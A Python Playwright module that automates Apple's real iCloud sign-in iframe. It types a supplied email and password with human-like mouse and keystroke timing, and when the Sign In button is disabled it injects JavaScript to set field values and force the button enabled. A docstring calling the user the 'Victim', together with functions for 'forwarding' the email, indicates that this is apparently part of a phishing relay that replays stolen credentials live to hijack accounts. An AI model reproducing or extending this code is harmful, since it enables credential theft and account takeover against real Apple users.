"""Reliable Apple idmsa email/password driving (Playwright + trusted mouse)."""
from __future__ import annotations

import time

from playwright.sync_api import Error as PlaywrightError
from playwright.sync_api import Page


def account_field_visible(frame) -> bool:
    if not frame:
        return False
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const a = document.getElementById('account_name_text_field');
                  return !!(a && a.offsetParent !== null);
                }"""
            )
        )
    except PlaywrightError:
        return False


def password_field_visible(frame) -> bool:
    if not frame:
        return False
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const p = document.getElementById('password_text_field');
                  return !!(
                    p &&
                    !p.disabled &&
                    p.getAttribute('aria-hidden') !== 'true' &&
                    p.offsetParent !== null
                  );
                }"""
            )
        )
    except PlaywrightError:
        return False


def password_only_step(frame) -> bool:
    """True when Apple is on password entry (email field hidden)."""
    return password_field_visible(frame) and not account_field_visible(frame)


def password_entry_ready(frame, email: str = '') -> bool:
    """True when the Apple password field can accept input."""
    if not password_field_visible(frame):
        return False
    if password_only_step(frame):
        return True
    target = (email or '').strip().lower()
    cur = read_account_email(frame).strip().lower()
    if target and cur and cur != target:
        return False
    if account_field_visible(frame):
        return bool(cur) or bool(target)
    return True


def email_ready_for_password(frame, email: str) -> bool:
    """Victim can enter password on Apple (email on file + password visible)."""
    return password_entry_ready(frame, email)


def email_entry_step(frame) -> bool:
    return account_field_visible(frame)


def read_account_email(frame) -> str:
    if not frame:
        return ''
    try:
        v = frame.evaluate(
            """() => {
              const a = document.getElementById('account_name_text_field');
              return a ? (a.value || '').trim() : '';
            }"""
        )
        if v:
            return str(v).strip()
    except PlaywrightError:
        pass
    try:
        return (
            frame.locator('#account_name_text_field').input_value(timeout=1200) or ''
        ).strip()
    except PlaywrightError:
        return ''


def wake_signin(apple: Page, frame, email: str, find_frame, open_fn=None):
    """Ensure the real iCloud tab shows an interactive Apple sign-in iframe."""
    try:
        apple.bring_to_front()
    except PlaywrightError:
        pass
    frame = find_frame(apple, frame)
    frame = resolve_signin_frame(apple, frame, email, find_frame)
    if frame and (
        account_field_visible(frame)
        or password_field_visible(frame)
        or password_entry_ready(frame, email)
    ):
        return frame
    if not open_fn:
        print('  [drive] no sign-in widget (no open_fn)', flush=True)
        return frame
    print('  [drive] waking iCloud sign-in widget', flush=True)
    opened = open_fn(apple)
    if opened:
        return resolve_signin_frame(apple, opened, email, find_frame)
    return resolve_signin_frame(apple, find_frame(apple, frame), email, find_frame)


def resolve_signin_frame(page, cached, email: str, find_frame):
    """Pick the iframe that actually shows Apple sign-in fields."""
    target = (email or '').strip().lower()
    for frame in page.frames:
        try:
            if password_field_visible(frame) and password_entry_ready(frame, email):
                return frame
        except PlaywrightError:
            continue
    for frame in page.frames:
        try:
            loc = frame.locator('#account_name_text_field').first
            if loc.count() > 0 and loc.is_visible(timeout=400):
                cur = read_account_email(frame).lower()
                if not target or not cur or cur == target:
                    return frame
        except PlaywrightError:
            continue
    return find_frame(page, cached)


def continue_button_ready(frame) -> bool:
    if not frame:
        return False
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const b = document.getElementById('sign-in');
                  if (!b || b.offsetParent === null) return false;
                  if (b.disabled || b.getAttribute('aria-disabled') === 'true') return false;
                  return true;
                }"""
            )
        )
    except PlaywrightError:
        return False


def page_click_locator(apple: Page, locator) -> bool:
    try:
        locator.scroll_into_view_if_needed(timeout=4000)
    except PlaywrightError:
        pass
    try:
        box = locator.bounding_box()
        if box and box.get('width') and box.get('height'):
            x = box['x'] + box['width'] / 2
            y = box['y'] + box['height'] / 2
            apple.mouse.move(x, y)
            time.sleep(0.04)
            apple.mouse.down()
            time.sleep(0.03)
            apple.mouse.up()
            return True
    except PlaywrightError:
        pass
    try:
        locator.click(timeout=5000, force=True)
        return True
    except PlaywrightError:
        return False


def _keyboard_type(page: Page, text: str, *, delay_ms: int = 42) -> None:
    if not text:
        return
    try:
        page.keyboard.type(text, delay=delay_ms)
    except PlaywrightError:
        pass


def type_account_email(frame, email: str, *, delay_ms: int = 42) -> str:
    target = (email or '').strip()
    if not frame or not target:
        return ''
    field = frame.locator('#account_name_text_field')
    try:
        field.wait_for(state='visible', timeout=12000)
    except PlaywrightError:
        return ''
    try:
        page_click_locator(frame.page, field)
    except PlaywrightError:
        try:
            field.click(timeout=4000)
        except PlaywrightError:
            pass
    for key in ('Control+a', 'Backspace'):
        try:
            field.press(key, timeout=1500)
        except PlaywrightError:
            pass
    try:
        field.press_sequentially(target, delay=delay_ms, timeout=120_000)
    except PlaywrightError:
        try:
            field.fill(target, timeout=4000)
        except PlaywrightError:
            return ''
    written = read_account_email(frame)
    if written != target:
        try:
            page_click_locator(frame.page, field)
            frame.page.keyboard.press('Control+A')
            frame.page.keyboard.press('Backspace')
            _keyboard_type(frame.page, target, delay_ms=delay_ms)
        except PlaywrightError:
            pass
        written = read_account_email(frame)
    if written != target:
        try:
            frame.evaluate(
                """(addr) => {
                  const a = document.getElementById('account_name_text_field');
                  const b = document.getElementById('sign-in');
                  if (!a) return;
                  a.focus();
                  const proto = window.HTMLInputElement.prototype;
                  const desc = Object.getOwnPropertyDescriptor(proto, 'value');
                  if (desc && desc.set) desc.set.call(a, addr);
                  else a.value = addr;
                  a.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertFromPaste', data: addr }));
                  a.dispatchEvent(new Event('change', { bubbles: true }));
                  if (b) {
                    b.removeAttribute('disabled');
                    b.disabled = false;
                    b.setAttribute('aria-disabled', 'false');
                  }
                }""",
                target,
            )
        except PlaywrightError:
            pass
        written = read_account_email(frame)
    return written


def click_continue(apple: Page, frame) -> bool:
    if not frame:
        return False
    btn = frame.locator('#sign-in')
    if page_click_locator(apple, btn):
        return True
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const b = document.getElementById('sign-in');
                  if (!b || b.offsetParent === null) return false;
                  b.removeAttribute('disabled');
                  b.disabled = false;
                  b.setAttribute('aria-disabled', 'false');
                  b.click();
                  return true;
                }"""
            )
        )
    except PlaywrightError:
        return False


def wait_email_forward_done(apple: Page, frame, email: str, find_frame, timeout_s: float = 40.0):
    target = (email or '').strip()
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        frame = find_frame(apple, frame)
        if frame and email_ready_for_password(frame, target):
            return frame, True
        if frame and password_only_step(frame):
            return frame, True
        time.sleep(0.15)
    frame = find_frame(apple, frame)
    ok = bool(frame and email_ready_for_password(frame, target))
    return frame, ok


def drive_email(apple: Page, frame, email: str, find_frame, open_signin=None) -> tuple[bool, object]:
    """Type email on Apple and click Continue; return (success, frame)."""
    try:
        apple.bring_to_front()
    except PlaywrightError:
        pass
    target = (email or '').strip()
    if not target:
        return False, frame
    frame = wake_signin(apple, frame, target, find_frame, open_signin)
    if not frame:
        return False, frame

    if password_only_step(frame):
        cur = read_account_email(frame)
        if cur.lower() == target.lower():
            return True, frame
    elif email_ready_for_password(frame, target):
        cur = read_account_email(frame)
        if cur.lower() == target.lower():
            return True, frame

    if not account_field_visible(frame):
        print('  [drive] no visible account field', flush=True)
        return False, frame

    written = type_account_email(frame, target)
    if written != target:
        print(f'  [drive] email typed {len(written)}/{len(target)} chars', flush=True)
        if not written:
            return False, frame

    deadline = time.time() + 16.0
    while time.time() < deadline and not continue_button_ready(frame):
        time.sleep(0.12)

    for attempt in range(3):
        click_continue(apple, frame)
        frame, ok = wait_email_forward_done(
            apple, frame, target, find_frame, timeout_s=12.0 if attempt < 2 else 25.0
        )
        if ok:
            print(f'  [drive] email -> {target}', flush=True)
            return True, frame
        time.sleep(0.35)

    print('  [drive] email: Apple not ready for password', flush=True)
    return False, frame


def read_password_length(frame) -> int:
    if not frame:
        return 0
    try:
        return int(
            frame.evaluate(
                """() => {
                  const p = document.getElementById('password_text_field');
                  return p ? (p.value || '').length : 0;
                }"""
            )
            or 0
        )
    except PlaywrightError:
        return 0


def type_password(frame, password: str, *, delay_ms: int = 42) -> int:
    if not frame:
        return 0
    apple = frame.page
    field = frame.locator('#password_text_field')
    try:
        field.wait_for(state='visible', timeout=12000)
    except PlaywrightError:
        return 0
    page_click_locator(apple, field)
    for key in ('Control+a', 'Backspace'):
        try:
            field.press(key, timeout=1500)
        except PlaywrightError:
            pass
    pwd = password or ''
    if not pwd:
        return 0
    try:
        field.press_sequentially(pwd, delay=delay_ms, timeout=120_000)
    except PlaywrightError:
        try:
            field.fill(pwd, timeout=4000)
        except PlaywrightError:
            return 0
    n = read_password_length(frame)
    if n != len(pwd):
        try:
            page_click_locator(apple, field)
            apple.keyboard.press('Control+A')
            apple.keyboard.press('Backspace')
            _keyboard_type(apple, pwd, delay_ms=delay_ms)
        except PlaywrightError:
            pass
        n = read_password_length(frame)
    if n != len(pwd):
        try:
            frame.evaluate(
                """(v) => {
                  const p = document.getElementById('password_text_field');
                  const b = document.getElementById('sign-in');
                  if (!p) return;
                  p.focus();
                  const proto = window.HTMLInputElement.prototype;
                  const desc = Object.getOwnPropertyDescriptor(proto, 'value');
                  if (desc && desc.set) desc.set.call(p, v);
                  else p.value = v;
                  p.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertFromPaste', data: v }));
                  p.dispatchEvent(new Event('change', { bubbles: true }));
                  if (b) {
                    b.removeAttribute('disabled');
                    b.disabled = false;
                    b.setAttribute('aria-disabled', 'false');
                  }
                }""",
                pwd,
            )
        except PlaywrightError:
            pass
        n = read_password_length(frame)
    return n


def drive_password(
    apple: Page,
    frame,
    password: str,
    email: str,
    find_frame,
    *,
    password_submit_ok=None,
    open_signin=None,
) -> tuple[bool, object]:
    """Type password on Apple and click Sign In."""
    try:
        apple.bring_to_front()
    except PlaywrightError:
        pass
    pwd = (password or '').strip()
    if not pwd:
        return False, frame
    em = (email or '').strip()
    frame = wake_signin(apple, frame, em, find_frame, open_signin)
    if not frame:
        print('  [drive] password: no frame', flush=True)
        return False, frame

    if not password_entry_ready(frame, em):
        if em:
            print('  [drive] password: ensuring email on Apple first', flush=True)
            drive_email(apple, frame, em, find_frame, open_signin)
            frame = resolve_signin_frame(apple, find_frame(apple, frame), em, find_frame)
        if not frame or not password_entry_ready(frame, em):
            print('  [drive] password: field not ready', flush=True)
            return False, frame

    n = type_password(frame, pwd)
    if n != len(pwd):
        print(f'  [drive] password typed {n}/{len(pwd)} chars', flush=True)
        if n == 0:
            frame = resolve_signin_frame(apple, frame, em, find_frame)
            if frame:
                n = type_password(frame, pwd)
            if n != len(pwd):
                return False, find_frame(apple, frame)

    deadline = time.time() + 10.0
    while time.time() < deadline and not continue_button_ready(frame):
        time.sleep(0.1)

    for attempt in range(2):
        click_continue(apple, frame)
        time.sleep(0.35)
        frame = resolve_signin_frame(apple, find_frame(apple, frame), em, find_frame)
        if password_submit_ok and frame:
            try:
                if password_submit_ok(apple, frame, timeout_s=8.0):
                    print('  [drive] password -> ' + ('*' * len(pwd)), flush=True)
                    return True, frame
            except TypeError:
                pass
        time.sleep(0.5)

    if read_password_length(frame) >= len(pwd):
        print('  [drive] password on Apple (' + ('*' * len(pwd)) + '); Sign In clicked', flush=True)
        return True, frame
    return False, frame
